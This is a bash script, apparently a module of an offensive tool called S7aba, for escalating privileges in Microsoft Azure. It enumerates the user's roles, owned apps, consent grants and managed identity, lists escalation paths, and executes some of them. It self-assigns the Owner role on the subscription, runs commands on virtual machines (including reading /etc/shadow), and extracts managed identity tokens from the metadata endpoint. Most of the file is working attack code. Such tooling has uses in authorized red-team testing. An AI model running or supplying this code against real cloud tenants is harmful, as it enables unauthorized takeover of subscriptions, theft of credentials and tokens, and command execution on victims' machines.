#!/usr/bin/env bash
# S7aba - Azure Privilege Escalation Module

declare -a ESCALATION_PATHS=()

analyze_permissions() {
    log_info "Analyzing Azure permissions for escalation vectors..."

    local my_id
    my_id=$(az ad signed-in-user show --query 'id' -o tsv 2>/dev/null)
    [[ -z "$my_id" ]] && { log_warn "Could not determine user ID"; return; }

    local assignments
    assignments=$(az role assignment list --assignee "$my_id" -o json 2>/dev/null)
    local roles
    roles=$(echo "$assignments" | jq -r '.[].roleDefinitionName' 2>/dev/null)

    # Check dangerous role assignments
    echo "$roles" | while read -r role; do
        case "$role" in
            "Owner") ESCALATION_PATHS+=("Owner") ;;
            "Contributor") ESCALATION_PATHS+=("Contributor") ;;
            "User Access Administrator") ESCALATION_PATHS+=("UserAccessAdmin") ;;
            "Virtual Machine Contributor") ESCALATION_PATHS+=("VMContributor") ;;
            "Automation Contributor") ESCALATION_PATHS+=("AutomationContrib") ;;
            "Logic App Contributor") ESCALATION_PATHS+=("LogicAppContrib") ;;
            "Key Vault Contributor") ESCALATION_PATHS+=("KeyVaultContrib") ;;
        esac
    done

    # Check for app registrations we own
    local owned_apps
    owned_apps=$(az ad app list --filter "owners/any(o:o eq '$my_id')" --query '[].displayName' -o tsv 2>/dev/null)
    [[ -n "$owned_apps" ]] && ESCALATION_PATHS+=("AppOwner")

    # Check service principal permissions
    local sp_perms
    sp_perms=$(az ad app permission list-grants --filter "principalId eq '$my_id'" -o json 2>/dev/null)
    if echo "$sp_perms" | jq -e '.[] | select(.scope == "/")' &>/dev/null; then
        ESCALATION_PATHS+=("TenantWideConsent")
    fi

    # Check for managed identity on current VM
    local imds
    imds=$(curl -s --max-time 2 -H "Metadata: true" \
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null)
    if echo "$imds" | jq -e '.access_token' &>/dev/null; then
        ESCALATION_PATHS+=("ManagedIdentity")
    fi
}

find_escalation_paths() {
    local paths=""

    # User Access Administrator - assign any role to yourself
    if [[ " ${ESCALATION_PATHS[*]} " =~ "UserAccessAdmin" ]]; then
        paths+="CRITICAL|UserAccessAdmin→Owner|Assign Owner role to self using User Access Administrator permissions\n"
    fi

    # Contributor - deploy resources that execute code
    if [[ " ${ESCALATION_PATHS[*]} " =~ "Contributor" ]]; then
        paths+="HIGH|Contributor→RunCommand|Execute commands on any VM via Run Command extension\n"
        paths+="HIGH|Contributor→CustomScript|Deploy Custom Script Extension on VMs for code execution\n"
        paths+="HIGH|Contributor→FunctionApp|Create Function App with managed identity to steal tokens\n"
    fi

    # VM Contributor - run commands on VMs
    if [[ " ${ESCALATION_PATHS[*]} " =~ "VMContributor" ]]; then
        paths+="HIGH|VMRunCommand|Execute arbitrary commands on virtual machines via RunCommand API\n"
        paths+="HIGH|VMCustomScript|Deploy malicious Custom Script Extension to VMs\n"
        paths+="MEDIUM|VMUserData|Inject commands via VM User Data (runs on boot)\n"
    fi

    # Automation Contributor - create runbooks
    if [[ " ${ESCALATION_PATHS[*]} " =~ "AutomationContrib" ]]; then
        paths+="HIGH|AutomationRunbook|Create runbook with RunAs account to access subscription resources\n"
        paths+="HIGH|AutomationWebhook|Create webhook for persistent code execution with RunAs creds\n"
    fi

    # Logic App Contributor
    if [[ " ${ESCALATION_PATHS[*]} " =~ "LogicAppContrib" ]]; then
        paths+="HIGH|LogicAppManagedId|Create Logic App with managed identity to call ARM APIs\n"
    fi

    # Key Vault Contributor
    if [[ " ${ESCALATION_PATHS[*]} " =~ "KeyVaultContrib" ]]; then
        paths+="HIGH|KeyVaultPolicyMod|Modify Key Vault access policies to grant self secret read\n"
    fi

    # Application Owner
    if [[ " ${ESCALATION_PATHS[*]} " =~ "AppOwner" ]]; then
        paths+="HIGH|AppSecretAdd|Add credentials to owned app with privileged service principal\n"
        paths+="MEDIUM|AppRedirectURI|Modify redirect URI for OAuth token theft\n"
    fi

    # Managed Identity abuse
    if [[ " ${ESCALATION_PATHS[*]} " =~ "ManagedIdentity" ]]; then
        paths+="HIGH|ManagedIdentityToken|Extract managed identity token from IMDS for ARM API access\n"
    fi

    # Tenant-wide consent
    if [[ " ${ESCALATION_PATHS[*]} " =~ "TenantWideConsent" ]]; then
        paths+="CRITICAL|TenantConsent|Application has tenant-wide consented permissions\n"
    fi

    echo -e "$paths"
}

exploit_paths() {
    local paths="$1"
    log_warn "Select escalation path to attempt:"

    echo "$paths" | while IFS='|' read -r risk method description; do
        [[ -z "$method" ]] && continue
        echo -e "  ${YELLOW}→${RESET} ${method}"
    done

    echo ""
    read -rp "$(echo -e "${YELLOW}[?] Enter method name: ${RESET}")" selected

    case "$selected" in
        "UserAccessAdmin→Owner")
            log_warn "Attempting role self-assignment..."
            local sub_id
            sub_id=$(az account show --query 'id' -o tsv)
            local my_id
            my_id=$(az ad signed-in-user show --query 'id' -o tsv)

            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would assign Owner to $my_id on subscription $sub_id"
            else
                az role assignment create --role "Owner" --assignee "$my_id" \
                    --scope "/subscriptions/$sub_id" 2>/dev/null
                log_success "Owner role assigned to current user"
            fi
            ;;
        "VMRunCommand")
            log_warn "Attempting VM Run Command..."
            local vms
            vms=$(az vm list --query '[].{Name:name,RG:resourceGroup}' -o json 2>/dev/null)
            echo "$vms" | jq -r '.[] | "  \(.RG)/\(.Name)"'

            read -rp "$(echo -e "${YELLOW}[?] Target VM (rg/name): ${RESET}")" target
            local rg vm_name
            rg="${target%%/*}"
            vm_name="${target##*/}"

            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would run command on $vm_name in $rg"
            else
                az vm run-command invoke --resource-group "$rg" --name "$vm_name" \
                    --command-id RunShellScript --scripts "id && whoami && cat /etc/shadow 2>/dev/null || net user" 2>/dev/null
                log_success "Command executed on $vm_name"
            fi
            ;;
        "ManagedIdentityToken")
            log_warn "Extracting managed identity token..."
            local token
            token=$(curl -s -H "Metadata: true" \
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
            if echo "$token" | jq -e '.access_token' &>/dev/null; then
                log_success "Managed identity token obtained"
                log_info "Token type: $(echo "$token" | jq -r '.token_type')"
                log_info "Expires: $(echo "$token" | jq -r '.expires_on')"
                log_info "Resource: $(echo "$token" | jq -r '.resource')"
            fi
            ;;
        *)
            log_warn "Method '$selected' — manual exploitation required"
            ;;
    esac
}
